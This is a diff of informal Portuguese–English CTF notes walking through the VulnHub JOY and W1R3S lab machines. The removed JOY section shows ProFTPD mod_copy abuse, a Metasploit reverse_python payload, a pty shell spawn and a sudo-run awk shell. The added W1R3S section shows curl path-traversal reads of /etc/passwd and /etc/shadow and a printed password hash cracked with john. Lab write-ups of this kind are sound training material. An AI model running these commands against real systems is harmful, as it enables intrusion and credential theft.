@@ -41,97 +41,83 @@ Read morde About natwork on VM.
 
 ## Documentação das etapas de resolução do CTF ##
 
-## 01 - Hacker Fest: 2019
-https://www.vulnhub.com/entry/hacker-fest-2019,378/
+## 05 w1r3s
 
-## 02 - Pentester Lab: S2-052 
-https://www.vulnhub.com/entry/pentester-lab-s2-052,206/
-need to created a VM and used ISO as disk
+1. Reconnaissance (Recon)
+Perform an Nmap scan to identify open ports.
+Command Examples:
+bash
 
-## 03 - Droopy: v0.2
-https://www.vulnhub.com/entry/droopy-v02,143/
-
-## 04 - `digitalworld.local: JOY`. 
-
-- https://www.vulnhub.com/entry/digitalworldlocal-joy,298/
-- set VM your NAT lab.
-
-### 1. Reconhecimento (Recon)
-1. Execute uma varredura com Nmap para identificar portas abertas.
-   ```bash
-   nmap -sV -v -Pn  <host> / nmap -sC -A -p- -Pn <host>
-
--Resultado da Varredura - 
-   PORT    STATE SERVICE     VERSION
--21/tcp  open  ftp         ProFTPD * anonymous 
--22/tcp  open  ssh         Dropbear sshd 0.34 (protocol 2.0)
--25/tcp  open  smtp        Postfix smtpd
--80/tcp  open  http        Apache httpd 2.4.25
--110/tcp open  pop3        Dovecot pop3d
--139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
--143/tcp open  imap        Dovecot imapd
--445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
--465/tcp open  smtp        Postfix smtpd
--587/tcp open  smtp        Postfix smtpd
--993/tcp open  ssl/imaps?
--995/tcp open  ssl/pop3s?
-
-Service Info: Hosts: The,  JOY.localdomain, 127.0.1.1, JOY; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+nmap -sV -v -Pn <host>  
+nmap -sC -A -p- -Pn <host>  
+Scan Results:
+bash
 
 
-2. Enumeração
 
-1. ftp <host> can use terminal ou tabs windows. anyway
-- serach files for anyting important.
--rwxrwxr-x   1 ftp      ftp         26009 Nov 18 23:06 directory * interisting
 
-2. nc <host> 21 * open door 
-nc 10.10.10.11 21
-220 The Good Tech Inc. FTP Server
-site cpfr /home/patrick/version_control
-350 File or directory exists, ready for destination name
-site cpto /home/ftp/version_control
-250 Copy successful
 
-1.2 ftp <host>
+***********************************************************
 
-get version_control * Ready this ^^bagaça^^ 
-site path was changedm pay atention.
+Service Info:  
+- Hosts: The, JOY.localdomain, 127.0.1.1, JOY  
+- OS: Linux  
+- CPE: cpe:/o:linux:linux_kernel
 
-3. msfconsole 
-search proftpd 
-use * mode copy *
-options 
-pay atentio *
-sitepath, payload my casa I used set payload ^^cmd/unix/reverse_python^^ and exploit or run.
-be csi and find what metter.
+***********************************************************
+  
+2. Enumeration
+FTP Enumeration
+FTP allows anonymous login.
+Search for files in the FTP directory for anything useful.
+Files Found:
+diff
+//////////////////
+dirb / gobuster / nikto
 
-tattol this on your head=> python -c "import pty; pty.spawn('/bin/bash')'
+http://10.10.10.12/administrator/installation/
+Files Found:
+Cuppa CMS
 
-su <usr>
-su -l <look for perm>
+********************************
+searchsploit cuppa 
+locate  past path.
+cat <paht>
 
-3. Armamento wepon
 
-echo "awk 'BEGIN {system(\"/bin/bash\")}'" > test
 
-3.1 ftp put <virys>
 
-3.2 nc <host> 21
-nc 10.10.10.11 21
-220 The Good Tech Inc. FTP Server
-site cpfr /home/ftp/test * cpfr => copy fron 
-350 File or directory exists, ready for destination name
-site cpto /home/patrick/script/test * cpto => copy to ^^this path on patrick root acess.
-250 Copy successful
-421 Login timeout (300 seconds): closing control connection
 
-4. sersrsrsrs
-   msfconsole 
-sudo /home/patrick/script/test
 
-whoami 
-root baby
+
+
+4. Exploiting 
+
+
+
+# curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.10.10.12/administrator/alerts/alertConfigField.php?
+
+# curl -s --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://10.10.10.12/administrator/alerts/alertConfigField.php?
+
+search for pwd.
+
+copy 
+w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
+vi <wires>
+john wires.
+
+
+ssh <usr>@<host>
+
+sudo -l
+
+root
+4. Privilege Escalation
+Dont need
+
+
+root  
+
 
 
 
